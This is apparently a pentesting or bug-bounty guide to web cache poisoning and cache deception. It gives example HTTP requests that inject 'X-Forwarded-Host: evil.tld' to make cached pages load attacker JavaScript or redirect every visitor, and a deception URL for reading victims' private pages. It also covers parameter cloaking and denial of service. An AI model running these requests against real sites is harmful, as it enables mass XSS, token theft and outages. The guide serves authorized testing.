# Web Cache Poisoning and Deception

Caches store a response under a key and serve it to everyone whose request matches that key. Two bug classes follow: poisoning (you make the cache store a malicious response that is served to others) and deception (you make the cache store a victim's private response under a key you can request). Both weaponize the gap between what the cache keys on and what the server actually uses.

## The mental model

A cache computes a key from part of the request (usually method, host, path, and some query/headers) and ignores the rest. If an unkeyed input influences the response, you can poison: send a request with a benign key but a malicious unkeyed input, the cache stores the poisoned response, and the next user with the same key gets it. Deception flips it: you trick the cache into caching a dynamic, authenticated page because the key makes it look like a static asset.

## Where it hides / tell-tales

- **Unkeyed headers that change the response**: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`, `X-Forwarded-For`, custom `X-*` headers that get reflected into links, scripts, redirects, or absolute URLs. The cache ignores them for keying but the origin uses them.
- **A cache is present**: `X-Cache: hit/miss`, `Age`, `CF-Cache-Status`, `Via`, `X-Served-By`, varying response times. No cache, no poisoning.
- **Reflected unkeyed input in a dangerous sink**: an unkeyed header reflected into an `<script src>` host, a redirect `Location`, or an inline value is poisoning-to-XSS or poisoning-to-redirect.
- **Cache key normalization quirks**: the cache and origin disagree on whether the query string, trailing slashes, case, or specific parameters matter. "Cache key normalization" bugs let you poison the key everyone hits.
- **Static-looking paths that return dynamic content**: `/profile`, `/account` reachable as `/profile/nonexistent.css` where the cache caches by extension but the app ignores the suffix and serves your private profile. That cached private page is now served to others (deception) or you request a victim's under a guessable path.

## Real material

Poisoning via unkeyed `X-Forwarded-Host` reflected into a script source:

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.tld

-- origin reflects it --
<script src="//evil.tld/app.js"></script>
-- cache stores this under the key for "/"; every subsequent visitor
   loads attacker JS. Host evil.tld/app.js to get stored XSS on everyone.
```

Finding the unkeyed input: send a cache-buster query param (to get your own cache slot) plus the candidate header, confirm reflection, then remove the buster to poison the shared key:

```http
GET /?cb=random123 HTTP/1.1
Host: target.com
X-Forwarded-Host: canary.evil.tld      (look for canary.evil.tld in the response)
```

Cache deception (victim's private page cached under a static-looking path):

```
Victim is logged in. Attacker sends them (or crawls) a link like:
  https://target.com/account/settings/nonexistent.css
If the app serves /account/settings ignoring the ".css" suffix, and the cache
caches by ".css" extension, the victim's private settings page is cached.
Attacker then requests the same URL and reads the cached private page.
```

Poisoning a redirect:

```http
GET /login HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.tld
-- if the origin builds the post-login redirect from X-Forwarded-Host and the
   302 is cached, everyone hitting /login gets redirected to evil.tld.
```

## Beyond the basics

- **Discovery with Param Miner**: the unkeyed header/parameter is the needle. Tools like Burp's Param Miner brute-force headers and parameters, watching for ones that change the response but not the cache key. This is the core skill; most targets have at least one reflected `X-*` header.
- **Cache key injection and normalization**: if you can influence the key itself (e.g. a parameter the cache keys on but normalizes loosely), you can target a specific victim's key or collapse many keys into one. Parameter cloaking (`?utm=1;poison=payload` where the cache keys on `utm` but the origin parses `poison`) and delimiter discrepancies between cache and origin enable precise poisoning.
- **Fat GET and method discrepancies**: a `GET` with a body, or a parameter in both the query and body, where the cache keys on one and the origin reads the other.
- **DoS via poisoning**: poison the shared key with a response that errors, is oversized, or has a broken `Content-Type`, taking the page down for everyone. Note as DoS; do not run against production.
- **Chaining**: cache poisoning is a delivery mechanism. Combine with an unkeyed header reflected into HTML (stored-XSS-for-everyone), into a redirect (open redirect for everyone, chain to OAuth theft), or with request smuggling (smuggle a response-splitting prefix that the cache stores). Smuggling-plus-cache is a particularly severe pairing.
- **Deception for token theft**: if the cached private page contains a CSRF token, API key, or session-bound secret, cache deception leaks it to the attacker who reads the cached copy.
- **CDN-specific quirks**: each CDN (Cloudflare, Akamai, Fastly, CloudFront) has its own keying rules, cacheable extensions, and header handling. Knowing the CDN narrows which headers are unkeyed and which extensions it caches by default.

## What to watch for

- Confirm a real cache is in play and that your poisoned response is served to a different session/request, not just reflected back to you.
- Always use a cache-buster during discovery so you do not poison the real shared key before you understand the impact; only poison the shared key to demonstrate, minimally.
- Poisoning affects all users of that key; it is high-collateral. Keep the payload benign (a harmless canary) for proof and report rather than deploying real XSS to everyone.
- Deception requires the victim to request the crafted URL or a crawler to cache it; frame the delivery honestly.

## Hunting checklist

- Confirm a cache via `X-Cache`/`Age`/`CF-Cache-Status` and timing.
- Use Param Miner to find unkeyed headers/parameters that change the response.
- Test the usual suspects: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`, `X-Forwarded-For`.
- Check where reflected unkeyed input lands (script src, redirect, inline) for impact.
- Test cache deception on authenticated pages with static-looking suffixes.
- Explore key normalization and parameter cloaking for targeted poisoning.
- Keep discovery cache-busted and proof benign.
